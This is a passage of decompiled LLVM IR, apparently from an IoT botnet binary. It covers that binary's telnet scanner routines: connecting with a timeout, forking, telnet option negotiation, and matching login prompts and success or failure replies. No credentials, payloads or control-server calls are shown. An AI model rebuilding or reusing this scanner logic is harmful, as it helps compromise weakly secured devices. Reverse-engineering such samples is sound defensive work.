  %storemerge = phi i32 [ %v5_9be8, %dec_label_pc_9bd4 ], [ 0, %dec_label_pc_9bc8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9b0c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9bf4, { 1, 0 }
  uselistorder label %dec_label_pc_9b20, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9c24 = icmp eq i32 %arg2, 0
  br i1 %v2_9c24, label %dec_label_pc_9c2c, label %dec_label_pc_9c3c

dec_label_pc_9c2c:                                ; preds = %entry
  %v2_9c30 = load i32, i32* %arg1, align 4
  %v1_9c38 = call i32 @__GI_close(i32 %v2_9c30)
  br label %dec_label_pc_9c3c

dec_label_pc_9c3c:                                ; preds = %entry, %dec_label_pc_9c2c
  %v2_9c44 = add i32 %tmp, 16
  %v3_9c44 = inttoptr i32 %v2_9c44 to i32*
  store i32 0, i32* %v3_9c44, align 4
  %v3_9c48 = load i32, i32* %stack_var_-24, align 4
  %v1_9c54 = trunc i32 %v3_9c48 to i8
  %v3_9c54 = add i32 %tmp, 8
  %v4_9c54 = inttoptr i32 %v3_9c54 to i8*
  store i8 %v1_9c54, i8* %v4_9c54, align 1
  %v1_9c5c = add i32 %tmp, 24
  %v2_9c5c = inttoptr i32 %v1_9c5c to i32*
  %v3_9c5c = load i32, i32* %v2_9c5c, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9c6c = inttoptr i32 %v3_9c5c to i8*
  %v3_9c6c = call i32 @__GI_memset(i8* %v2_9c6c, i32 0)
  ret i32 %v3_9c6c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9c3c, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9c80 = load i32, i32* @fp, align 4
  %v2_9c98 = inttoptr i32 %arg1 to i32*
  %v3_9c98 = call i32 @advance_state(i32* %v2_9c98, i32 0)
  %v3_9ca4 = add i32 %arg1, 9
  %v4_9ca4 = inttoptr i32 %v3_9ca4 to i8*
  store i8 1, i8* %v4_9ca4, align 1
  store i32 %v3_9c80, i32* @fp, align 4
  ret i32 %v3_9c98

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9cb8 = load i32, i32* @fp, align 4
  %v3_9cd0 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_2700c.52 to i32))
  store i32 %v3_9cb8, i32* @fp, align 4
  ret i32 %v3_9cd0
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9cf0 = load i32, i32* @fp, align 4
  %v3_9d08 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_26fec.61 to i32))
  store i32 %v3_9cf0, i32* @fp, align 4
  ret i32 %v3_9d08

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40240, i32* %stack_var_-4, align 4
  %v2_9d2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d2c, i32* @fp, align 4
  %v1_9d3c = call i32 @contains_success(i32 %arg1)
  %v2_9d44 = icmp eq i32 %v1_9d3c, 0
  br i1 %v2_9d44, label %dec_label_pc_9d4c, label %dec_label_pc_9d74

dec_label_pc_9d4c:                                ; preds = %entry
  %v1_9d50 = call i32 @contains_fail(i32 %arg1)
  %v2_9d58 = icmp ne i32 %v1_9d50, 0
  %. = zext i1 %v2_9d58 to i32
  br label %dec_label_pc_9d74

dec_label_pc_9d74:                                ; preds = %dec_label_pc_9d4c, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9d4c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_9db8

dec_label_pc_9db8:                                ; preds = %dec_label_pc_9db8, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_9dbc, %dec_label_pc_9db8 ]
  %v1_9dbc = add i32 %stack_var_-24.0, 1
  %v3_9dc8 = mul i32 %v1_9dbc, 4
  %v2_9dd4 = add i32 %v3_9dc8, %arg2
  %v1_9dd8 = inttoptr i32 %v2_9dd4 to i32*
  %v2_9dd8 = load i32, i32* %v1_9dd8, align 4
  %v2_9ddc = icmp eq i32 %v2_9dd8, 0
  br i1 %v2_9ddc, label %dec_label_pc_9e38.preheader, label %dec_label_pc_9db8

dec_label_pc_9e38.preheader:                      ; preds = %dec_label_pc_9db8
  %v3_9e10 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_9e38

dec_label_pc_9df0:                                ; preds = %dec_label_pc_9e38
  %v3_9df4 = mul i32 %storemerge2, 4
  %v2_9e00 = add i32 %v3_9df4, %arg2
  %v1_9e04 = inttoptr i32 %v2_9e00 to i32*
  %v2_9e04 = load i32, i32* %v1_9e04, align 4
  %v4_9e10 = call i32 @strcasestr(i8* %v3_9e10, i32 %v2_9e04, i32 %v3_9df4)
  %v2_9e18 = icmp eq i32 %v4_9e10, 0
  %v1_9e30 = add nuw i32 %storemerge2, 1
  br i1 %v2_9e18, label %dec_label_pc_9e38, label %dec_label_pc_9e50

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9df0, %dec_label_pc_9e38.preheader
  %storemerge2 = phi i32 [ %v1_9e30, %dec_label_pc_9df0 ], [ 0, %dec_label_pc_9e38.preheader ]
  %v5_9e44 = icmp slt i32 %storemerge2, %v1_9dbc
  br i1 %v5_9e44, label %dec_label_pc_9df0, label %dec_label_pc_9e50

dec_label_pc_9e50:                                ; preds = %dec_label_pc_9e38, %dec_label_pc_9df0
  %storemerge = phi i32 [ 1, %dec_label_pc_9df0 ], [ 0, %dec_label_pc_9e38 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_9dbc, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9e68 = load i32, i32* @fp, align 4
  store i32 %v3_9e68, i32* %stack_var_-16, align 4
  %v13_9e68 = ptrtoint i32* %stack_var_-16 to i32
  %v2_9e90 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9ea0 = or i32 %v2_9e90, 2048
  store i32 %v1_9ea0, i32* @r3, align 4
  %v2_9eb4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9ec8 = urem i32 %arg3, 65536
  %v1_9ed0 = call i32 @__GI_htons(i32 %v3_9ec8)
  %v3_9ef0 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9ef8 = icmp eq i32 %v3_9ef0, 0
  br i1 %v2_9ef8, label %dec_label_pc_9f0c, label %dec_label_pc_9f00

dec_label_pc_9f00:                                ; preds = %entry
  br label %dec_label_pc_a0c4

dec_label_pc_9f0c:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_9f20 = bitcast i32* %stack_var_-40 to i8*
  %v3_9f20 = call i32 @__GI_memset(i8* %v2_9f20, i32 0)
  %v2_9f24 = ptrtoint i32* %stack_var_-48 to i32
  %v3_9f34 = call i32 @__libc_connect(i32 %arg1, i32 %v2_9f24, i32 16)
  store i32 %v3_9f34, i32* @r3, align 4
  %v1_9f44 = icmp slt i32 %v3_9f34, 0
  br i1 %v1_9f44, label %dec_label_pc_9f4c, label %dec_label_pc_a088

dec_label_pc_9f4c:                                ; preds = %dec_label_pc_9f0c
  %v0_9f4c = call i32 @__GI___errno_location()
  %v1_9f54 = inttoptr i32 %v0_9f4c to i32*
  %v2_9f54 = load i32, i32* %v1_9f54, align 4
  %v7_9f58 = icmp eq i32 %v2_9f54, 115
  br i1 %v7_9f58, label %dec_label_pc_9f84.lr.ph, label %dec_label_pc_a07c

dec_label_pc_9f84.lr.ph:                          ; preds = %dec_label_pc_9f4c
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9f70 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9f84

dec_label_pc_9f84:                                ; preds = %dec_label_pc_9f84.lr.ph, %dec_label_pc_9f84
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9f84.lr.ph ], [ %v1_9f98, %dec_label_pc_9f84 ]
  %v5_9f90 = mul nuw nsw i32 %storemerge14, 4
  %v6_9f90 = add i32 %v5_9f90, %v2_9f70
  %v7_9f90 = inttoptr i32 %v6_9f90 to i32*
  store i32 0, i32* %v7_9f90, align 4
  %v1_9f98 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_9f98, 32
  br i1 %tmp28, label %dec_label_pc_9f84, label %dec_label_pc_9fac

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f84
  %v3_9fb0 = udiv i32 %arg1, 32
  %v3_9fbc = mul nuw nsw i32 %v3_9fb0, 4
  %v2_9fc4 = add nsw i32 %v3_9fbc, -160
  %v2_9fc8 = add i32 %v2_9fc4, %v13_9e68
  %v1_9fcc = inttoptr i32 %v2_9fc8 to i32*
  %v2_9fcc = load i32, i32* %v1_9fcc, align 4
  %v1_9fd4 = urem i32 %arg1, 32
  %v6_9fdc = shl i32 1, %v1_9fd4
  %v2_9fe0 = or i32 %v2_9fcc, %v6_9fdc
  store i32 %v2_9fe0, i32* %v1_9fcc, align 4
  %v1_a000 = add i32 %arg1, 1
  store i32 %v2_9f70, i32* @ip, align 4
  %v2_a008 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a020 = call i32 @__libc_select(i32 %v1_a000, i32 0, i32 %v2_9f70, i32 0, i32 %v2_a008)
  %tmp29 = icmp slt i32 %v5_a020, 1
  br i1 %tmp29, label %dec_label_pc_a070, label %dec_label_pc_a030

dec_label_pc_a030:                                ; preds = %dec_label_pc_9fac
  store i32 4, i32* %stack_var_-188, align 4
  %v2_a038 = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_a038, i32* @ip, align 4
  %v2_a03c = ptrtoint i32* %stack_var_-188 to i32
  %v5_a054 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_a038, i32 %v2_a03c)
  %v3_a058 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a058, i32* @r3, align 4
  %v2_a05c = icmp eq i32 %v3_a058, 0
  br i1 %v2_a05c, label %dec_label_pc_a088, label %dec_label_pc_a064

dec_label_pc_a064:                                ; preds = %dec_label_pc_a030
  br label %dec_label_pc_a0c4

dec_label_pc_a070:                                ; preds = %dec_label_pc_9fac
  br label %dec_label_pc_a0c4

dec_label_pc_a07c:                                ; preds = %dec_label_pc_9f4c
  br label %dec_label_pc_a0c4

dec_label_pc_a088:                                ; preds = %dec_label_pc_9f0c, %dec_label_pc_a030
  %v2_a094 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a0a4 = and i32 %v2_a094, -2049
  store i32 %v1_a0a4, i32* @r3, align 4
  %v2_a0b8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a0c4

dec_label_pc_a0c4:                                ; preds = %dec_label_pc_a07c, %dec_label_pc_a070, %dec_label_pc_a064, %dec_label_pc_9f00, %dec_label_pc_a088
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a070 ], [ 1, %dec_label_pc_a088 ], [ 0, %dec_label_pc_a064 ], [ 0, %dec_label_pc_a07c ], [ 0, %dec_label_pc_9f00 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9f70, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a0c4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a088, { 1, 0 }
  uselistorder label %dec_label_pc_9f84, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_a0dc = load i32, i32* @r4, align 4
  %v6_a0dc = load i32, i32* @r5, align 4
  %v9_a0dc = load i32, i32* @r6, align 4
  %v12_a0dc = load i32, i32* @fp, align 4
  store i32 41188, i32* %stack_var_-4, align 4
  %v2_a0e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a0e0, i32* @fp, align 4
  %v0_a0e8 = call i32 @__libc_fork()
  %v2_a0f8 = icmp eq i32 %v0_a0e8, 0
  br i1 %v2_a0f8, label %dec_label_pc_a264, label %dec_label_pc_a10c

dec_label_pc_a10c:                                ; preds = %entry
  %v2_a110 = load i32, i32* @global_var_272d8.63, align 4
  %v5_a110 = load i32, i32* @global_var_272dc.64, align 4
  %v2_a11c = add i32 %v2_a110, 1
  %v3_a11c = icmp eq i32 %v2_a11c, 0
  %v4_a120 = zext i1 %v3_a11c to i32
  %v5_a120 = add i32 %v4_a120, %v5_a110
  store i32 %v2_a11c, i32* @global_var_272d8.63, align 4
  store i32 %v5_a120, i32* @global_var_272dc.64, align 4
  %v2_a13c = add i32 %v2_a110, 2
  %v3_a13c = icmp eq i32 %v2_a11c, -1
  %v4_a140 = zext i1 %v3_a13c to i32
  %v5_a140 = add i32 %v5_a120, %v4_a140
  %v3_a144 = udiv i32 %v2_a13c, 1073741824
  %v3_a148 = mul i32 %v5_a140, 4
  %v2_a14c = or i32 %v3_a148, %v3_a144
  store i32 %v2_a14c, i32* @r4, align 4
  %v3_a150 = mul i32 %v2_a13c, 4
  %v1_a158 = call i32 @malloc(i32 %v3_a150)
  br label %dec_label_pc_a1b0

dec_label_pc_a170:                                ; preds = %dec_label_pc_a1b0, %dec_label_pc_a1fc
  %v3_a174 = mul i32 %storemerge2, 4
  %v2_a180 = add i32 %v3_a174, %v1_a158
  %v2_a194 = load i32, i32* @global_var_2d540.66, align 4
  %v2_a198 = add i32 %v2_a194, %v3_a174
  %v1_a19c = inttoptr i32 %v2_a198 to i32*
  %v2_a19c = load i32, i32* %v1_a19c, align 4
  %v2_a1a0 = inttoptr i32 %v2_a180 to i32*
  store i32 %v2_a19c, i32* %v2_a1a0, align 4
  %v1_a1a8 = add i32 %storemerge2, 1
  br label %dec_label_pc_a1b0

dec_label_pc_a1b0:                                ; preds = %dec_label_pc_a10c, %dec_label_pc_a170
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a10c ], [ %v1_a1a8, %dec_label_pc_a170 ]
  %v2_a1c8 = load i32, i32* @global_var_272d8.63, align 4
  %v5_a1c8 = load i32, i32* @global_var_272dc.64, align 4
  %v2_a1dc = add i32 %v2_a1c8, -1
  %v3_a1dc = icmp ne i32 %v2_a1c8, 0
  %v3_a1e0 = add i32 %v5_a1c8, -1
  %v5_a1e0 = sext i1 %v3_a1dc to i32
  %v9_a1f4 = icmp eq i32 %v3_a1e0, %v5_a1e0
  br i1 %v9_a1f4, label %dec_label_pc_a1fc, label %dec_label_pc_a170

dec_label_pc_a1fc:                                ; preds = %dec_label_pc_a1b0
  store i32 %v2_a1dc, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a1dc, %storemerge2
  br i1 %tmp, label %dec_label_pc_a170, label %dec_label_pc_a21c

dec_label_pc_a21c:                                ; preds = %dec_label_pc_a1fc
  store i32 %v5_a1c8, i32* @r4, align 4
  %v3_a224 = mul i32 %v2_a1c8, 4
  %v1_a228 = add i32 %v1_a158, -4
  %v2_a234 = add i32 %v1_a228, %v3_a224
  %v2_a23c = inttoptr i32 %v2_a234 to i32*
  store i32 %v0_a0e8, i32* %v2_a23c, align 4
  %v2_a244 = load i32, i32* @global_var_2d540.66, align 4
  store i32 %v2_a244, i32* @r0, align 4
  %v0_a24c = call i32 @free()
  store i32 %v1_a158, i32* @global_var_2d540.66, align 4
  br label %dec_label_pc_a264

dec_label_pc_a264:                                ; preds = %entry, %dec_label_pc_a21c
  store i32 %v3_a0dc, i32* @r4, align 4
  store i32 %v6_a0dc, i32* @r5, align 4
  store i32 %v9_a0dc, i32* @r6, align 4
  store i32 %v12_a0dc, i32* @fp, align 4
  ret i32 %v0_a0e8

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a174, { 1, 0 }
  uselistorder i32 %v1_a158, { 2, 0, 1 }
  uselistorder i32 %v2_a11c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a264, { 1, 0 }
  uselistorder label %dec_label_pc_a1b0, { 1, 0 }
  uselistorder label %dec_label_pc_a170, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a2a0 = add i32 %arg2, 1
  %v1_a2a4 = inttoptr i32 %v1_a2a0 to i8*
  %v2_a2a4 = load i8, i8* %v1_a2a4, align 1
  %v7_a2b0 = icmp ult i8 %v2_a2a4, -5
  br i1 %v7_a2b0, label %dec_label_pc_a3fc, label %dec_label_pc_a2b8

dec_label_pc_a2b8:                                ; preds = %entry
  %v7_a2c0 = icmp eq i8 %v2_a2a4, -1
  br i1 %v7_a2c0, label %dec_label_pc_a2c4, label %dec_label_pc_a2e0

dec_label_pc_a2c4:                                ; preds = %dec_label_pc_a2b8
  br label %dec_label_pc_a3fc

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a2b8
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a2e8 = ptrtoint i8* %stack_var_-17 to i32
  %v5_a2fc = call i32 @__libc_send(i32 %arg1, i32 %v2_a2e8, i32 1, i32 16384)
  %v2_a308 = load i8, i8* %v1_a2a4, align 1
  %v7_a30c = icmp eq i8 %v2_a308, -4
  br i1 %v7_a30c, label %dec_label_pc_a314, label %dec_label_pc_a320

dec_label_pc_a314:                                ; preds = %dec_label_pc_a2e0
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3c0

dec_label_pc_a320:                                ; preds = %dec_label_pc_a2e0
  %v2_a328 = load i8, i8* %v1_a2a4, align 1
  %v7_a32c = icmp eq i8 %v2_a328, -2
  br i1 %v7_a32c, label %dec_label_pc_a334, label %dec_label_pc_a340

dec_label_pc_a334:                                ; preds = %dec_label_pc_a320
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3c0

dec_label_pc_a340:                                ; preds = %dec_label_pc_a320
  %v2_a348 = load i8, i8* %v1_a2a4, align 1
  %v7_a34c = icmp eq i8 %v2_a348, 3
  %v7_a360 = icmp eq i8 %v2_a348, -3
  br i1 %v7_a34c, label %dec_label_pc_a354, label %dec_label_pc_a38c

dec_label_pc_a354:                                ; preds = %dec_label_pc_a340
  br i1 %v7_a360, label %dec_label_pc_a368, label %dec_label_pc_a374

dec_label_pc_a368:                                ; preds = %dec_label_pc_a354
  br label %dec_label_pc_a37c

dec_label_pc_a374:                                ; preds = %dec_label_pc_a354
  br label %dec_label_pc_a37c

dec_label_pc_a37c:                                ; preds = %dec_label_pc_a368, %dec_label_pc_a374
  %storemerge = phi i8 [ -3, %dec_label_pc_a374 ], [ -5, %dec_label_pc_a368 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3c0

dec_label_pc_a38c:                                ; preds = %dec_label_pc_a340
  br i1 %v7_a360, label %dec_label_pc_a3a0, label %dec_label_pc_a3ac

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a38c
  br label %dec_label_pc_a3b4

dec_label_pc_a3ac:                                ; preds = %dec_label_pc_a38c
  br label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a3a0, %dec_label_pc_a3ac
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a3ac ], [ -4, %dec_label_pc_a3a0 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3c0

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a37c, %dec_label_pc_a334, %dec_label_pc_a314, %dec_label_pc_a3b4
  %v4_a3d4 = call i32 @__libc_send(i32 %arg1, i32 %v2_a2e8, i32 1, i32 16384)
  %v1_a3dc = add i32 %arg2, 2
  %v4_a3f0 = call i32 @__libc_send(i32 %arg1, i32 %v1_a3dc, i32 1, i32 16384)
  br label %dec_label_pc_a3fc

dec_label_pc_a3fc:                                ; preds = %dec_label_pc_a2c4, %dec_label_pc_a3c0, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a3fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a3c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_a37c, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a430 = call i32 @strlen(i8* %arg1)
  %v2_a478 = add i32 %v3_a430, %tmp
  br label %dec_label_pc_a54c

dec_label_pc_a450:                                ; preds = %dec_label_pc_a4d8, %dec_label_pc_a4b4, %dec_label_pc_a490, %dec_label_pc_a46c
  %v1_a454 = add nsw i32 %stack_var_-28.013, 1
  %v7_a468 = icmp sgt i32 %v3_a430, %v1_a454
  br i1 %v7_a468, label %dec_label_pc_a46c, label %dec_label_pc_a4fc

dec_label_pc_a46c:                                ; preds = %dec_label_pc_a45c.preheader, %dec_label_pc_a450
  %stack_var_-28.013 = phi i32 [ %v1_a454, %dec_label_pc_a450 ], [ %stack_var_-28.1, %dec_label_pc_a45c.preheader ]
  %v2_a480 = sub i32 %v2_a478, %stack_var_-28.013
  %v1_a484 = inttoptr i32 %v2_a480 to i8*
  %v2_a484 = load i8, i8* %v1_a484, align 1
  %v2_a488 = icmp eq i8 %v2_a484, 0
  br i1 %v2_a488, label %dec_label_pc_a450, label %dec_label_pc_a490

dec_label_pc_a490:                                ; preds = %dec_label_pc_a46c
  %v2_a4a8 = load i8, i8* %v1_a484, align 1
  %v7_a4ac = icmp eq i8 %v2_a4a8, 32
  br i1 %v7_a4ac, label %dec_label_pc_a450, label %dec_label_pc_a4b4

dec_label_pc_a4b4:                                ; preds = %dec_label_pc_a490
  %v2_a4cc = load i8, i8* %v1_a484, align 1
  %v7_a4d0 = icmp eq i8 %v2_a4cc, 13
  br i1 %v7_a4d0, label %dec_label_pc_a450, label %dec_label_pc_a4d8

dec_label_pc_a4d8:                                ; preds = %dec_label_pc_a4b4
  %v2_a4f0 = load i8, i8* %v1_a484, align 1
  %v7_a4f4 = icmp eq i8 %v2_a4f0, 10
  br i1 %v7_a4f4, label %dec_label_pc_a450, label %dec_label_pc_a4fc

dec_label_pc_a4fc:                                ; preds = %dec_label_pc_a4d8, %dec_label_pc_a450, %dec_label_pc_a45c.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a45c.preheader ], [ %stack_var_-28.013, %dec_label_pc_a4d8 ], [ %v1_a454, %dec_label_pc_a450 ]
  %v2_a510 = sub i32 %v2_a478, %stack_var_-28.0.lcssa
  %v1_a514 = inttoptr i32 %v2_a510 to i8*
  %v2_a514 = load i8, i8* %v1_a514, align 1
  %v2_a524 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1cc10.68 to i32)
  %v1_a528 = inttoptr i32 %v2_a524 to i8*
  %v2_a528 = load i8, i8* %v1_a528, align 1
  %v9_a52c = icmp eq i8 %v2_a514, %v2_a528
  %v1_a544 = add i32 %storemerge2, 1
  br i1 %v9_a52c, label %dec_label_pc_a56c, label %dec_label_pc_a54c

dec_label_pc_a54c:                                ; preds = %dec_label_pc_a4fc, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a4fc ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a544, %dec_label_pc_a4fc ]
  %v3_a554 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cc10.68, i32 0, i32 0))
  %v3_a55c = icmp ult i32 %storemerge2, %v3_a554
  br i1 %v3_a55c, label %dec_label_pc_a45c.preheader, label %dec_label_pc_a56c

dec_label_pc_a45c.preheader:                      ; preds = %dec_label_pc_a54c
  %v7_a46812 = icmp sgt i32 %v3_a430, %stack_var_-28.1
  br i1 %v7_a46812, label %dec_label_pc_a46c, label %dec_label_pc_a4fc

dec_label_pc_a56c:                                ; preds = %dec_label_pc_a54c, %dec_label_pc_a4fc
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a4fc ], [ 0, %dec_label_pc_a54c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a430, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a4fc, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a588 = load i32, i32* @fp, align 4
  store i32 %v3_a588, i32* %stack_var_-16, align 4
  %v13_a588 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a5d8 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a618 = udiv i32 %arg1, 32
  %v3_a624 = mul nuw nsw i32 %v3_a618, 4
  %v1_a63c = urem i32 %arg1, 32
  %v6_a644 = shl i32 1, %v1_a63c
  %v1_a668 = add i32 %arg1, 1
  %v2_a670 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a790 = inttoptr i32 %arg2 to i8*
  %v2_a7a4 = icmp eq i32 %arg3, 0
  %v1_a7b0 = inttoptr i32 %arg6 to i8*
  %v5_a7f4 = icmp sgt i32 %arg5, 0
  %v2_a62c = add nsw i32 %v3_a624, -152
  %v2_a630 = add i32 %v2_a62c, %v13_a588
  %v1_a634 = inttoptr i32 %v2_a630 to i32*
  br label %dec_label_pc_a7cc

dec_label_pc_a5ec.lr.ph:                          ; preds = %dec_label_pc_a7e0, %dec_label_pc_a7ec
  br label %dec_label_pc_a5ec

dec_label_pc_a5ec:                                ; preds = %dec_label_pc_a5ec.lr.ph, %dec_label_pc_a5ec
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a5ec.lr.ph ], [ %v1_a600, %dec_label_pc_a5ec ]
  %v5_a5f8 = mul nuw nsw i32 %storemerge27, 4
  %v6_a5f8 = add i32 %v5_a5f8, %v2_a5d8
  %v7_a5f8 = inttoptr i32 %v6_a5f8 to i32*
  store i32 0, i32* %v7_a5f8, align 4
  %v1_a600 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a600, 32
  br i1 %tmp30, label %dec_label_pc_a5ec, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5ec
  %v2_a634 = load i32, i32* %v1_a634, align 4
  %v2_a648 = or i32 %v2_a634, %v6_a644
  store i32 %v2_a648, i32* %v1_a634, align 4
  %v5_a684 = call i32 @__libc_select(i32 %v1_a668, i32 %v2_a5d8, i32 0, i32 0, i32 %v2_a670)
  %tmp31 = icmp slt i32 %v5_a684, 1
  br i1 %tmp31, label %dec_label_pc_a810, label %dec_label_pc_a694

dec_label_pc_a694:                                ; preds = %dec_label_pc_a614
  %v2_a6a0 = add i32 %stack_var_-40.0, %arg6
  %v5_a6a4 = inttoptr i32 %v2_a6a0 to i8*
  %v6_a6b8 = call i32 @__libc_recv(i32 %arg1, i32 %v2_a6a0, i32 1, i32 0, i32 %v2_a6a0)
  %v7_a6c8 = icmp eq i32 %v6_a6b8, -1
  br i1 %v7_a6c8, label %dec_label_pc_a6dc, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a694
  %v2_a6d4 = icmp eq i32 %v6_a6b8, 0
  br i1 %v2_a6d4, label %dec_label_pc_a6dc, label %dec_label_pc_a6e8

dec_label_pc_a6dc:                                ; preds = %dec_label_pc_a6d0, %dec_label_pc_a694
  br label %dec_label_pc_a818

